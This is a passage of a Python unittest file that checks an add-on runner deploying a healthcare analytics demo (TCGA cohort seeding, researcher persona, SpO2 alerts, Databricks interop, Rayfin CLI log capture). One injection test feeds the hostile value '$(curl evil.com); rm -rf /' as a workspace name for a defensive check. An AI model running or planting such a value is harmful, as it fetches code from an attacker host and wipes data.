        import re
        for ws_name in ("med-1027", "med-1027a", "med-device-rti-hds-1028"):
            derived = "cardio" + re.sub("[^a-z0-9]", "", ws_name.lower())[-6:]
            self.assertLessEqual(len(derived), 12)
            self.assertRegex(derived, r"\A[a-z0-9]{1,12}\Z")
        source = (Path(addons.__file__)).read_text()
        self.assertIn('"ARM_TENANT_ID": cfg["expected_tenant_id"]', source)
        self.assertIn('re.sub("[^a-z0-9]", "", cfg["fabric_workspace_name"].lower())[-6:]', source)



class WowDemoAddonWiringTests(unittest.IsolatedAsyncioTestCase):
    def make_runner(self, config_updates=None):
        runner = object.__new__(addons.AddonRunner)
        runner.id = "test-run"
        runner.config = {
            "expected_tenant_id": "11111111-1111-1111-1111-111111111111",
            "expected_subscription_id": "22222222-2222-2222-2222-222222222222",
            "resource_group_name": "rg-test",
            "fabric_workspace_name": "med-test",
            "location": "eastus2",
            "cardiology_location": "eastus2",
            "admin_security_group": "sg-admins",
            "databricks_environment": "prod",
            **(config_updates or {}),
        }
        runner.env = {"HLS_NONINTERACTIVE": "1"}
        runner.pids = {}
        runner.ws = "workspace-id-123"
        runner.phase = {"phase": "Add-on: Rayfin", "status": "running", "subSteps": []}
        runner.deployment = {
            "customStatus": {"subStepsByPhase": {}},
            "output": {"phases": [runner.phase], "resources": {}},
            "runtimeStatus": "Running",
        }
        runner.log = Mock()
        runner.persist = Mock()
        runner.resource = Mock(return_value={"name": "sttest", "id": "res-id"})
        runner.items = [
            {"id": "clin-id", "type": "Lakehouse", "displayName": "clinical_lakehouse"},
            {"id": "img-id", "type": "Lakehouse", "displayName": "imaging_lakehouse"},
            {"id": "p360-id", "type": "Lakehouse", "displayName": "patient360"},
            {"id": "silver-id", "type": "Lakehouse", "displayName": "healthcare1_msft_silver"},
            {"id": "eh-id", "type": "KQLDatabase", "displayName": "MasimoEventhouse"},
        ]
        runner.cloud = Mock()
        # Workspace item listings return the current runner.items; anything else is a Graph group lookup.
        runner.cloud.items = Mock(side_effect=lambda url, *_, **__: list(runner.items) if url.endswith("/items") else [{"id": "g-id", "displayName": "admin-group"}])
        runner.cloud.call = Mock(return_value={"properties": {"queryServiceUri": "https://eh.kusto.fabric.microsoft.com"}})
        runner.ps = AsyncMock()
        runner.run_fabric_job = AsyncMock()
        runner.verify_silver_tcga_patients = AsyncMock(return_value=15)
        runner.refresh_gold_sql_metadata = AsyncMock()
        runner._deployer_upn = Mock(return_value="deployer@example.com")
        return runner
    async def test_demo_step_defaults(self):
        # Default configuration runs the safe demo steps and never the identity step
        runner = self.make_runner()
        runner.command = AsyncMock(return_value="")
        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"

        await runner.prepare_rayfin_imaging(root)

        commands = [call.args[1] for call in runner.command.await_args_list]
        tcga_calls = [cmd for cmd in commands if any("seed_tcga_cohort.py" in str(arg) for arg in cmd)]
        self.assertEqual(len(tcga_calls), 1)
        self.assertIn("apply", tcga_calls[0])

        researcher_calls = [cmd for cmd in commands if any("manage_researcher_persona.py" in str(arg) for arg in cmd)]
        self.assertEqual(len(researcher_calls), 0)
        activator_calls = [cmd for cmd in commands if any("deploy_clinical_activator.py" in str(arg) for arg in cmd)]
        self.assertEqual(len(activator_calls), 0)
        trigger_calls = [cmd for cmd in commands if any("trigger_spo2_alert.py" in str(arg) for arg in cmd)]
        self.assertEqual(len(trigger_calls), 0)

        substeps = runner.phase.get("subSteps", [])
        skipped_substep = next((s for s in substeps if s.get("status") == "skipped"), None)
        self.assertIsNotNone(skipped_substep)
        self.assertIn("no alert_email configured", skipped_substep.get("detail", ""))

        runner_dbx = self.make_runner()
        runner_dbx.command = AsyncMock(return_value="")
        runner_dbx.working_copy = Mock(return_value=Path("/tmp/unused-dbx"))
        runner_dbx.resource = Mock(return_value={"id": "fhir-id", "name": "res-name"})
        runner_dbx.ensure_metastore = AsyncMock()
        runner_dbx.ensure_admin_group = AsyncMock()
        runner_dbx.ensure_onelake_databricks_storage = AsyncMock(return_value="abfss://...")
        runner_dbx.databricks_alert_recipient = AsyncMock(return_value="")

        with patch.object(addons, "az_json", side_effect=[
            {"properties": {"exportConfiguration": {"storageAccountName": "exports"}}},
            {"user": {"name": "deployer@example.com"}},
        ]), \
        patch.object(addons, "ensure_providers_registered", return_value=[]), \
        patch.object(addons.Cloud, "items", return_value=[{"id": "g-id", "displayName": "admin-group"}]), \
        patch.dict(sys.modules, {"yaml": Mock(safe_load=Mock(return_value={"targets": {}}), safe_dump=Mock(return_value=""))}), \
        patch("pathlib.Path.read_text", return_value='{"workspaceUrl": {"value": "https://adb"}, "accessConnectorId": {"value": "ac"}, "managedLocationUrl": {"value": "loc"}, "dicomOutputUrl": {"value": "out"}, "warehouse_id": "wh-1"}'), \
        patch("pathlib.Path.write_text"), patch("pathlib.Path.chmod"):
            await runner_dbx.databricks()

        dbx_commands = [call.args[1] for call in runner_dbx.command.await_args_list]
        interop_calls = [cmd for cmd in dbx_commands if any("09-onelake-interop-proof.py" in str(arg) for arg in cmd)]
        self.assertEqual(len(interop_calls), 1)
        self.assertIn("--live", interop_calls[0])
        self.assertIn("--workspace-id", interop_calls[0])
        self.assertIn("workspace-id-123", interop_calls[0])
    async def test_seed_tcga_cohort_invoked_in_sequence(self):
        runner = self.make_runner({"seed_tcga_cohort": True})
        executed_sequence = []

        async def track_command(title, args, *_, **__):
            executed_sequence.append(("command", title, args))
            runner.substep(title, "succeeded")
            return ""

        async def track_job(item_type, item_name, job_type, *_, **__):
            executed_sequence.append(("job", item_type, item_name, job_type))
            return {"status": "Completed"}

        async def track_sql_refresh(*_, **__):
            executed_sequence.append(("sql_refresh",))

        runner.command = AsyncMock(side_effect=track_command)
        runner.ps = AsyncMock(side_effect=lambda title, script, params: executed_sequence.append(("ps", title, str(script), params)))
        runner.run_fabric_job = AsyncMock(side_effect=track_job)
        runner.verify_silver_tcga_patients = AsyncMock(side_effect=lambda: executed_sequence.append(("verify_silver",)) or 15)
        runner.refresh_gold_sql_metadata = AsyncMock(side_effect=track_sql_refresh)
        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
        await runner.prepare_rayfin_imaging(root)

        cmd_titles = [item[1] for item in executed_sequence if item[0] == "command"]
        self.assertIn("rayfin-imaging: seed Patient 360 silos and shortcuts", cmd_titles)
        self.assertIn("rayfin-imaging: seed TCGA synthetic FHIR cohort", cmd_titles)

        p360_idx = cmd_titles.index("rayfin-imaging: seed Patient 360 silos and shortcuts")
        tcga_idx = cmd_titles.index("rayfin-imaging: seed TCGA synthetic FHIR cohort")
        self.assertEqual(tcga_idx, p360_idx + 1)

        tcga_cmd = next(item[2] for item in executed_sequence if item[0] == "command" and item[1] == "rayfin-imaging: seed TCGA synthetic FHIR cohort")
        self.assertTrue(any("seed_tcga_cohort.py" in str(a) for a in tcga_cmd))
        self.assertIn("apply", tcga_cmd)
        self.assertIn("--resource-group", tcga_cmd)
        self.assertIn(runner.config["resource_group_name"], tcga_cmd)
        self.assertIn("--subscription", tcga_cmd)
        self.assertIn(runner.config["expected_subscription_id"], tcga_cmd)

        substeps = {s["name"]: s["status"] for s in runner.phase.get("subSteps", [])}
        self.assertEqual(substeps.get("rayfin-imaging: seed TCGA synthetic FHIR cohort"), "succeeded")
        all_actions = [item[0] if item[0] != "job" else f"job:{item[2]}" for item in executed_sequence]
        tcga_action_idx = all_actions.index("command")
        export_idx = all_actions.index("ps")
        pipe_idx = all_actions.index("job:healthcare1_msft_clinical_data_foundation_ingestion")
        nb_idx = all_actions.index("job:materialize_reporting_tables")
        silver_idx = all_actions.index("verify_silver")
        sql_idx = all_actions.index("sql_refresh")
        self.assertLess(tcga_action_idx, export_idx)
        self.assertLess(export_idx, pipe_idx)
        self.assertLess(pipe_idx, nb_idx)
        self.assertLess(nb_idx, silver_idx)
        self.assertLess(silver_idx, sql_idx)
        self.assertLess(nb_idx, sql_idx)

    async def test_researcher_persona_invoked_in_sequence(self):
        runner = self.make_runner({"enable_researcher_persona": True, "seed_tcga_cohort": False, "enable_alert_stopwatch": False})
        executed_sequence = []

        async def track_command(title, args, *_, **__):
            executed_sequence.append((title, args))
            runner.substep(title, "succeeded")
            return ""

        runner.command = AsyncMock(side_effect=track_command)
        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
        await runner.prepare_rayfin_imaging(root)

        titles = [t[0] for t in executed_sequence]
        self.assertIn("rayfin-imaging: manage researcher persona", titles)
        self.assertIn("rayfin-imaging: seed de-identified clinical silo", titles)

        persona_idx = titles.index("rayfin-imaging: manage researcher persona")
        deid_idx = titles.index("rayfin-imaging: seed de-identified clinical silo")
        self.assertLess(persona_idx, deid_idx)

        persona_args = executed_sequence[persona_idx][1]
        self.assertTrue(any("manage_researcher_persona.py" in str(a) for a in persona_args))
        self.assertIn("--create", persona_args)
        self.assertIn("--workspace-id", persona_args)
        self.assertIn("workspace-id-123", persona_args)

        deid_args = executed_sequence[deid_idx][1]
        self.assertTrue(any("seed_deidentified_clinical.py" in str(a) for a in deid_args))
        self.assertIn("--live", deid_args)
        substeps = {s["name"]: s["status"] for s in runner.phase.get("subSteps", [])}
        self.assertEqual(substeps.get("rayfin-imaging: manage researcher persona"), "succeeded")
        self.assertEqual(substeps.get("rayfin-imaging: seed de-identified clinical silo"), "succeeded")

    async def test_alert_stopwatch_invoked_in_sequence(self):
        runner = self.make_runner({
            "enable_alert_stopwatch": True,
            "alert_email": "nurse@hospital.example",
            "seed_tcga_cohort": False,
            "enable_researcher_persona": False,
        })
        executed_sequence = []

        async def track_command(title, args, *_, **kwargs):
            executed_sequence.append((title, args, kwargs.get("env", {})))
            runner.substep(title, "succeeded")
            return ""

        runner.command = AsyncMock(side_effect=track_command)
        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
        await runner.prepare_rayfin_imaging(root)

        titles = [t[0] for t in executed_sequence]
        self.assertIn("rayfin-imaging: deploy clinical activator reflex", titles)
        self.assertIn("rayfin-imaging: trigger SpO2 alert stopwatch", titles)

        act_idx = titles.index("rayfin-imaging: deploy clinical activator reflex")
        trig_idx = titles.index("rayfin-imaging: trigger SpO2 alert stopwatch")
        self.assertLess(act_idx, trig_idx)

        act_args, act_env = executed_sequence[act_idx][1], executed_sequence[act_idx][2]
        self.assertTrue(any("deploy_clinical_activator.py" in str(a) for a in act_args))
        self.assertIn("--live", act_args)
        self.assertEqual(act_env.get("HLS_ALERT_EMAIL"), "nurse@hospital.example")

        trig_args, trig_env = executed_sequence[trig_idx][1], executed_sequence[trig_idx][2]
        self.assertTrue(any("trigger_spo2_alert.py" in str(a) for a in trig_args))
        self.assertIn("--live", trig_args)
        self.assertEqual(trig_env.get("HLS_ALERT_EMAIL"), "nurse@hospital.example")

        substeps = {s["name"]: s["status"] for s in runner.phase.get("subSteps", [])}
        self.assertEqual(substeps.get("rayfin-imaging: deploy clinical activator reflex"), "succeeded")
        self.assertEqual(substeps.get("rayfin-imaging: trigger SpO2 alert stopwatch"), "succeeded")

    async def test_databricks_interop_invoked_in_sequence(self):
        runner = self.make_runner({"verify_databricks_interop": True})
        executed_sequence = []

        async def track_command(title, args, *_, **__):
            executed_sequence.append((title, args))
            runner.substep(title, "succeeded")
            return ""

        runner.command = AsyncMock(side_effect=track_command)
        runner.working_copy = Mock(return_value=Path("/tmp/unused-dbx"))
        runner.resource = Mock(return_value={"id": "fhir-id", "name": "res-name"})
        runner.ensure_metastore = AsyncMock()
        runner.ensure_admin_group = AsyncMock()
        runner.ensure_onelake_databricks_storage = AsyncMock(return_value="abfss://...")
        runner.databricks_alert_recipient = AsyncMock(return_value="")

        with patch.object(addons, "az_json", side_effect=[
            {"properties": {"exportConfiguration": {"storageAccountName": "exports"}}},
            {"user": {"name": "deployer@example.com"}},
        ]), \
        patch.object(addons, "ensure_providers_registered", return_value=[]), \
        patch.object(addons.Cloud, "items", return_value=[{"id": "g-id", "displayName": "admin-group"}]), \
        patch.dict(sys.modules, {"yaml": Mock(safe_load=Mock(return_value={"targets": {}}), safe_dump=Mock(return_value=""))}), \
        patch("pathlib.Path.read_text", return_value='{"workspaceUrl": {"value": "https://adb"}, "accessConnectorId": {"value": "ac"}, "managedLocationUrl": {"value": "loc"}, "dicomOutputUrl": {"value": "out"}, "warehouse_id": "wh-1"}'), \
        patch("pathlib.Path.write_text"), patch("pathlib.Path.chmod"):
            await runner.databricks()

        titles = [t[0] for t in executed_sequence]
        self.assertIn("databricks: verify OneLake Unity Catalog interop", titles)
        interop_cmd = next(t[1] for t in executed_sequence if t[0] == "databricks: verify OneLake Unity Catalog interop")
        self.assertTrue(any("09-onelake-interop-proof.py" in str(a) for a in interop_cmd))
        self.assertIn("--live", interop_cmd)
        self.assertIn("--workspace-id", interop_cmd)
        self.assertIn("workspace-id-123", interop_cmd)
        substeps = {s["name"]: s["status"] for s in runner.phase.get("subSteps", [])}
        self.assertEqual(substeps.get("databricks: verify OneLake Unity Catalog interop"), "succeeded")

    async def _run_databricks_with_live_items(self, runner, live_items):
        executed = []

        async def track_command(title, args, *_, **__):
            executed.append(title)
            runner.substep(title, "succeeded")
            return ""

        runner.command = AsyncMock(side_effect=track_command)
        runner.working_copy = Mock(return_value=Path("/tmp/unused-dbx"))
        runner.resource = Mock(return_value={"id": "fhir-id", "name": "res-name"})
        runner.ensure_metastore = AsyncMock()
        runner.ensure_admin_group = AsyncMock()
        runner.ensure_onelake_databricks_storage = AsyncMock(return_value="abfss://...")
        runner.databricks_alert_recipient = AsyncMock(return_value="")
        runner.cloud.items = Mock(side_effect=lambda url, *_, **__: list(live_items) if url.endswith("/items") else [{"id": "g-id", "displayName": "admin-group"}])
        with patch.object(addons, "az_json", side_effect=[
            {"properties": {"exportConfiguration": {"storageAccountName": "exports"}}},
            {"user": {"name": "deployer@example.com"}},
        ]), \
        patch.object(addons, "ensure_providers_registered", return_value=[]), \
        patch.dict(sys.modules, {"yaml": Mock(safe_load=Mock(return_value={"targets": {}}), safe_dump=Mock(return_value=""))}), \
        patch("pathlib.Path.read_text", return_value='{"workspaceUrl": {"value": "https://adb"}, "accessConnectorId": {"value": "ac"}, "managedLocationUrl": {"value": "loc"}, "dicomOutputUrl": {"value": "out"}, "warehouse_id": "wh-1"}'), \
        patch("pathlib.Path.write_text"), patch("pathlib.Path.chmod"):
            await runner.databricks()
        return executed

    async def test_databricks_interop_sees_lakehouses_created_after_discover(self):
        # med-1109: rayfin created clinical_lakehouse after discover(); the stale snapshot
        # failed databricks with "Expected exactly one clinical_lakehouse, found 0".
        runner = self.make_runner({"verify_databricks_interop": True})
        live = list(runner.items)
        runner.items = [i for i in runner.items if i["displayName"] not in ("clinical_lakehouse", "patient360")]
        executed = await self._run_databricks_with_live_items(runner, live)
        self.assertIn("databricks: verify OneLake Unity Catalog interop", executed)

    async def test_databricks_interop_skips_with_reason_without_rayfin_lakehouses(self):
        runner = self.make_runner({"verify_databricks_interop": True})
        live = [i for i in runner.items if i["displayName"] != "clinical_lakehouse"]
        executed = await self._run_databricks_with_live_items(runner, live)
        self.assertNotIn("databricks: verify OneLake Unity Catalog interop", executed)
        step = next(s for s in runner.phase["subSteps"] if s["name"] == "databricks: verify OneLake Unity Catalog interop")
        self.assertEqual(step["status"], "skipped")
        self.assertIn("clinical_lakehouse", step.get("detail", ""))

    async def test_demo_step_failure_is_not_swallowed(self):
        runner = self.make_runner({"seed_tcga_cohort": True})

        async def fail_tcga(title, args, *_, **__):
            if "seed TCGA synthetic FHIR cohort" in title:
                runner.substep(title, "failed", f"{title} (seed_tcga_cohort.py) exited with code 1")
                raise RuntimeError(f"{title} (seed_tcga_cohort.py) exited with code 1")
            return ""

        runner.command = AsyncMock(side_effect=fail_tcga)
        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"

        with self.assertRaises(RuntimeError) as ctx:
            await runner.prepare_rayfin_imaging(root)

        self.assertIn("seed_tcga_cohort.py", str(ctx.exception))
        self.assertIn("exited with code 1", str(ctx.exception))

        substeps = {s["name"]: s["status"] for s in runner.phase.get("subSteps", [])}
        self.assertEqual(substeps.get("rayfin-imaging: seed TCGA synthetic FHIR cohort"), "failed")

    async def test_idempotent_rerun_succeeds(self):
        runner = self.make_runner({
            "seed_tcga_cohort": True,
            "enable_researcher_persona": True,
            "enable_alert_stopwatch": True,
            "alert_email": "nurse@hospital.example",
        })
        runner.command = AsyncMock(return_value="")
        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"

        await runner.prepare_rayfin_imaging(root)
        count_run_1 = runner.command.await_count

        await runner.prepare_rayfin_imaging(root)
        count_run_2 = runner.command.await_count

        self.assertEqual(count_run_2, count_run_1 * 2)

    async def test_command_injection_rejected(self):
        malicious_input = "$(curl evil.com); rm -rf /"
        runner = self.make_runner({
            "fabric_workspace_name": malicious_input,
            "resource_group_name": malicious_input,
            "seed_tcga_cohort": True,
        })
        captured_args = []

        async def capture_exec(title, args, *_, **__):
            captured_args.append(args)
            return ""

        runner.command = AsyncMock(side_effect=capture_exec)
        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
        await runner.prepare_rayfin_imaging(root)

        for cmd in captured_args:
            self.assertIsInstance(cmd, list)
            if malicious_input in cmd:
                self.assertIn(malicious_input, cmd)

    async def test_identity_creation_blocked_by_default(self):
        for flag_val in (None, False, "false", "False", "no", "0"):
            config = {"seed_tcga_cohort": False, "enable_alert_stopwatch": False}
            if flag_val is not None:
                config["enable_researcher_persona"] = flag_val
            runner = self.make_runner(config)
            runner.command = AsyncMock(return_value="")
            root = Path(__file__).resolve().parents[2] / "rayfin-imaging"
            await runner.prepare_rayfin_imaging(root)

            commands = [call.args[1] for call in runner.command.await_args_list]
            persona_calls = [cmd for cmd in commands if any("manage_researcher_persona.py" in str(arg) for arg in cmd)]
            self.assertEqual(len(persona_calls), 0, f"Expected 0 calls for flag_val={flag_val}")

    async def test_email_dispatch_requires_alert_email(self):
        root = Path(__file__).resolve().parents[2] / "rayfin-imaging"

        for empty_email in ("", None):
            runner = self.make_runner({"alert_email": empty_email, "seed_tcga_cohort": False})
            runner.command = AsyncMock(return_value="")
            await runner.prepare_rayfin_imaging(root)

            commands = [call.args[1] for call in runner.command.await_args_list]
            alert_calls = [cmd for cmd in commands if any("deploy_clinical_activator.py" in str(a) or "trigger_spo2_alert.py" in str(a) for a in cmd)]
            self.assertEqual(len(alert_calls), 0)

        runner = self.make_runner({"alert_email": "nurse@hospital.example", "seed_tcga_cohort": False})
        captured = []
        async def record_cmd(title, args, *_, **kwargs):
            captured.append((title, args, kwargs.get("env", {})))
            return ""
        runner.command = AsyncMock(side_effect=record_cmd)
        await runner.prepare_rayfin_imaging(root)

        activator_call = next((c for c in captured if any("deploy_clinical_activator.py" in str(a) for a in c[1])), None)
        trigger_call = next((c for c in captured if any("trigger_spo2_alert.py" in str(a) for a in c[1])), None)
        self.assertIsNotNone(activator_call)
        self.assertIsNotNone(trigger_call)
        self.assertEqual(activator_call[2].get("HLS_ALERT_EMAIL"), "nurse@hospital.example")
        self.assertEqual(trigger_call[2].get("HLS_ALERT_EMAIL"), "nurse@hospital.example")

        runner_disabled = self.make_runner({"alert_email": "nurse@hospital.example", "enable_alert_stopwatch": False, "seed_tcga_cohort": False})
        runner_disabled.command = AsyncMock(return_value="")
        await runner_disabled.prepare_rayfin_imaging(root)
        dis_commands = [call.args[1] for call in runner_disabled.command.await_args_list]
        dis_alert_calls = [cmd for cmd in dis_commands if any("deploy_clinical_activator.py" in str(a) or "trigger_spo2_alert.py" in str(a) for a in cmd)]
        self.assertEqual(len(dis_alert_calls), 0)

        for title, args, _ in captured:
            self.assertNotIn("nurse@hospital.example", title)
            for a in args:
                self.assertNotIn("nurse@hospital.example", str(a))

    async def test_missing_cli_script_file_raises(self):
        runner = self.make_runner()
        nonexistent = "/tmp/nonexistent_script_xyz_123.py"
        with self.assertRaises(FileNotFoundError) as ctx:
            await runner.command("test missing script", [sys.executable, nonexistent])
        self.assertIn("Script file not found", str(ctx.exception))
        substeps = {s["name"]: s["status"] for s in runner.phase.get("subSteps", [])}
        self.assertEqual(substeps.get("test missing script"), "failed")

    def test_emulator_device_count_alignment(self):
        deploy_ps1 = (addons.ROOT / "phase-1/deploy.ps1").read_text(encoding="utf-8")
        deploy_all_ps1 = (addons.ROOT / "Deploy-All.ps1").read_text(encoding="utf-8")
        self.assertIn("elseif ($SeedTcgaCohort) { 115 } else { 100 }", deploy_ps1)
        self.assertIn("elseif ($SeedTcgaCohort) { 115 } else { 100 }", deploy_all_ps1)
        self.assertIn('"deviceCount=$effectiveDeviceCount"', deploy_ps1)
        self.assertIn("$deployArgs['DeviceCount'] = $effectiveDeviceCount", deploy_all_ps1)


class RayfinLogCollectionTests(unittest.IsolatedAsyncioTestCase):
    # Writes a log the way the Rayfin CLI 1.36.2 does: uppercase levels (DEBUG/INFO/ERROR, never WARN),
    # and the first record names the writing process.
    FAKE_RAYFIN = (
        "import json, os, pathlib, sys\n"
        "d = pathlib.Path(os.environ['HOME']) / '.rayfin' / 'logs'\n"
        "d.mkdir(parents=True, exist_ok=True)\n"
        "start = json.dumps({'schemaVersion': 1, 'commandName': 'up', 'processId': os.getpid()})\n"
        "(d / f'2026-11-10T120000.000Z-up-{os.getpid():036d}.log').write_text(\n"
        "    f'2026-11-10T12:00:00.000Z INFO invocation Command started {start}\\n'\n"
        "    '2026-11-10T12:00:01.000Z DEBUG functions.deploy retrying publish\\n'\n"
        "    '2026-11-10T12:00:02.000Z ERROR invocation Command completed {\"status\":\"failed\"}\\n')\n"
        "sys.exit(int(sys.argv[1]))\n"
    )

    def runner(self, home):
        runner = object.__new__(addons.AddonRunner)
        runner.id, runner.pids, runner.save = "run-1", {}, Mock()
        runner.deployment = {"customStatus": {}}
        runner.phase = {"phase": "Add-ons: rayfin"}
        runner.env = {**addons.os.environ, "HOME": str(home)}
        runner.env.pop("RAYFIN_CONFIG_DIR", None)
        return runner

    def jsonl(self, data_dir):
        return [json.loads(line) for line in (data_dir / "logs" / "run-1.jsonl").read_text().splitlines()]

    async def test_failed_up_keeps_its_own_log_and_ignores_other_processes(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp, patch.object(addons, "DATA_DIR", Path(tmp) / "data"):
            data_dir, home = Path(tmp) / "data", Path(tmp) / "home"
            # Another invocation's log, newer than this run's, so "pick the newest log" would grab it.
            foreign = home / ".rayfin" / "logs" / "2026-11-10T130000.000Z-up-other.log"
            foreign.parent.mkdir(parents=True)
            foreign.write_text('2026-11-10T13:00:00.000Z INFO invocation FOREIGN-RUN-MARKER {"processId": 1}\n')
            future = time.time() + 3600
            os.utime(foreign, (future, future))
            runner = self.runner(home)
            with self.assertRaisesRegex(RuntimeError, "exited with code 3"):
                await runner.rayfin_command("rayfin-imaging: deploy", [sys.executable, "-c", self.FAKE_RAYFIN, "3"], Path(tmp), runner.env)
            kept = list((data_dir / "logs" / "rayfin" / "run-1").iterdir())
            self.assertEqual(len(kept), 1)
            self.assertIn("Command completed", kept[0].read_text())
            self.assertNotIn("FOREIGN-RUN-MARKER", kept[0].read_text())
            rayfin = [e for e in self.jsonl(data_dir) if e.get("source") == "rayfin-cli"]
            self.assertEqual([e["level"] for e in rayfin], ["info", "info", "error"])
            self.assertEqual(rayfin[-1]["message"], '[rayfin] invocation Command completed {"status":"failed"}')
            self.assertTrue(all(e["phase"] == "Add-ons: rayfin" for e in rayfin))
            self.assertFalse(any("FOREIGN-RUN-MARKER" in e["message"] for e in rayfin))

    async def test_long_log_is_capped_in_the_run_log_but_kept_whole_on_disk(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp, patch.object(addons, "DATA_DIR", Path(tmp) / "data"), \
             patch.object(addons, "RAYFIN_LOG_LINE_LIMIT", 2):
            data_dir = Path(tmp) / "data"
            runner = self.runner(Path(tmp) / "home")
            await runner.rayfin_command("rayfin-imaging: deploy", [sys.executable, "-c", self.FAKE_RAYFIN, "0"], Path(tmp), runner.env)
            rayfin = [e for e in self.jsonl(data_dir) if e.get("source") == "rayfin-cli"]
            self.assertEqual(len(rayfin), 3)
            self.assertIn("log truncated after 2 lines", rayfin[-1]["message"])
            kept = next((data_dir / "logs" / "rayfin" / "run-1").iterdir())
            self.assertEqual(len(kept.read_text().splitlines()), 3)

    async def test_missing_log_is_reported_without_masking_the_command_result(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp, patch.object(addons, "DATA_DIR", Path(tmp) / "data"):
            data_dir = Path(tmp) / "data"
            runner = self.runner(Path(tmp) / "home")
            self.assertEqual(await runner.rayfin_command("rayfin: noop", [sys.executable, "-c", "pass"], Path(tmp), runner.env), "")
            self.assertTrue(any("wrote no diagnostic log" in e["message"] and e["level"] == "warn" for e in self.jsonl(data_dir)))

    async def test_log_collection_failure_never_replaces_the_command_result(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp, patch.object(addons, "DATA_DIR", Path(tmp) / "data"), \
             patch.object(addons.shutil, "copyfile", side_effect=OSError("disk full")):
            data_dir = Path(tmp) / "data"
            runner = self.runner(Path(tmp) / "home")
            self.assertEqual(await runner.rayfin_command("rayfin: ok", [sys.executable, "-c", self.FAKE_RAYFIN, "0"], Path(tmp), runner.env), "")
            with self.assertRaisesRegex(RuntimeError, "exited with code 3"):
                await runner.rayfin_command("rayfin: fail", [sys.executable, "-c", self.FAKE_RAYFIN, "3"], Path(tmp), runner.env)
            warnings = [e for e in self.jsonl(data_dir) if e["level"] == "warn" and "could not collect Rayfin CLI log" in e["message"]]
            self.assertEqual(len(warnings), 2)


if __name__ == "__main__":
    unittest.main()
